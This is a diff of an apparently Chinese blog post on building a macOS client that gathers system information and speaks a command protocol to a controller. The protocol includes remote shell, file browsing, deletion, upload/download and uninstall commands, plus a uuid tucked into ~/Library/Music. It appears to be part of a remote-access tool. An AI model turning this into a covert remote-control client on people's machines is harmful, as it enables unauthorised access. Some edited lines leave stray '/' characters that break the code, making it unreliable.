@@ -6,18 +6,8 @@
  
 苹果达尔文内核的如下东西，linux里面就没有：
  
- //kern_return_t kr;
-    //host_name_port_t myhost;
-   // kernel_version_t kversion;
-   // host_basic_info_data_t hinfo;
-   // mach_msg_type_number_t count;
-    char            *cpu_type_name,*cpu_subtype_name;
-   // vm_size_t  page_size;
-   // myhost = mach_host_self();
-   // kr = host_kernel_version(myhost, kversion);
-   // count = HOST_BASIC_INFO_COUNT;
-   // kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&hinfo, &count);
-   // kr = host_page_size(myhost, &page_size);                                               //
+ //kern_return_t kr;     //host_name_port_t myhost;    // kernel_version_t kversion;    // host_basic_info_data_t hinfo;    // mach_msg_type_number_t count;     char            *cpu_type_name,*cpu_subtype_name;    // vm_size_t  page_size;
+   // myhost = mach_host_self();    // kr = host_kernel_version(myhost, kversion);    // count = HOST_BASIC_INFO_COUNT;    // kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&hinfo, &count);    // kr = host_page_size(myhost, &page_size);                                               // 
  
 所以换一种思路我们考虑使用，shell命令获取信息，完后进行字符处理，这样即使换了系统，我们代码里面换换shell命令就可以了。
  
@@ -30,12 +20,12 @@
 
 #ifndef mac_client_mac_h
 #define mac_client_mac_h
-////////////////////////////////////////////////////////////////////////////////////////
+
 /*
 1.注意中文标点，编译器不容易察觉
 2.server 和client端的宏定义大小要统一
 */
-/////////////////////////////////////////////////////////////////////////////////////////
+/
 #define MAX_SIZE 1024
 #define MAX_NAME_LENGTH 64
 #define MAX_PATH 260            //保持和windows端定义的一样
@@ -46,7 +36,7 @@
 #define MAX_SEND_BUFFER 1024*4
 #define MAX_RECV_BUFFER 1024*4
 
-/////////////////////////////////////////////////////////////////////////////////////////
+/
 
 
 
@@ -95,7 +85,7 @@ enum
     COMMAND_BREAK,             //断开链接
     COMMAND_UNINSTALL,         //卸载　
     COMMAND_MODIFY_REMARK,     //修改备注
-///////////////////////////////////////////////////////////////////////////
+///
     COMMAND_MANAGER_FILE,           //打开文件管理窗口
     COMMAND_GET_DIRECTORY,          //获取控制端主机根目录下所有文件信息 
     COMMAND_GET_REQUEST_DIRECTORY,  //获取双击请求目录中所有文件信息
@@ -103,19 +93,19 @@ enum
     COMMAND_WRONG_DIRECTORY,        //目录为空或者不可读
     COMMAND_DELETE_FILE,            //删除文件
     COMMAND_FILE_CLOSE,             //关闭当前文件管理功能的链接
-//////////////////////////////////////////////////////////////////////////
+//
     
     COMMAND_MANAGER_CMD,    //打开cmd管理窗口
     TOKEN_CMD_NEXT,         //等待下一个命令
     COMMAND_SHELL,          //控制端请求的shell命令
     COMMAND_SHELL_CLOSE,    //关闭shell
-////////////////////////////////////////////////////////////////////////// 
+// 
     COMMAND_MANAGER_DOWNLOAD,   //打开文件下载功能
     TOKEN_DOWNLOAD_SETUP,   //控制端发送文件下载连接和uuid
     COMMAND_GET_FILEDATA,   //请求文件数据
     TOKEN_SENT_FILEDATA,    //发送文件数据
     TOKEN_CANT_GET_DATA,    //给控制端发送消息文件不可读
-////////////////////////////////////////////////////////////////////////
+
     COMMAND_MANAGER_UPLOAD,     //开启文件上传
     TOKEN_UPLOAD_SETUP,         //接受文件上传连接
     COMMAND_SENT_UPLOAD_DATA,   //发送上传文件数据
@@ -132,8 +122,7 @@ enum
 
 #endif
 
-
- 
+  
  
 下面是代码：
 Systeminfo.h
@@ -199,8 +188,7 @@ int myexec(const char *cmd, string &resvec);//管道运行命令,得到一些系
 #endif	/* SYSTEM_INFO_H */
 
 
-
-实现：
+ 实现：
 //
 //  SystemInfo.cpp
 //  mac_client
@@ -498,7 +486,7 @@ int   GetDeviceInfo(SYS_INFO *si)
     printf("cpu:%d\n",si->cpu_num);
     printf("memory:%d\n",si->mem_total);
 
-///////////////////////////////////读备注文件//////////////////////////////////////////////////////
+///读备注文件//
     char path[MAX_PATH] = {0};
     char beizhu[MAX_PATH_MAC] = {0};
 
@@ -521,7 +509,7 @@ int   GetDeviceInfo(SYS_INFO *si)
 
     }
 
-///////////////////////////////////////读取uuid////////////////////////////////////////////////////////
+///读取uuid
     char uuidPath[MAX_PATH] = {0};
     sprintf(uuidPath,"/Users/%s/Library/Music",passwd->pw_name);
     strcat(uuidPath, "/uuid.lol");
@@ -539,7 +527,7 @@ int   GetDeviceInfo(SYS_INFO *si)
 
 
 
-/////////////////////////////////////////////////////////////////////////////////////////////
+/
     return 0;
 }
 
@@ -550,8 +538,7 @@ int   GetDeviceInfo(SYS_INFO *si)
 
 //#endif
 
-
- 
+  
  
 搭建传输的socket平台参考下面博文：
  
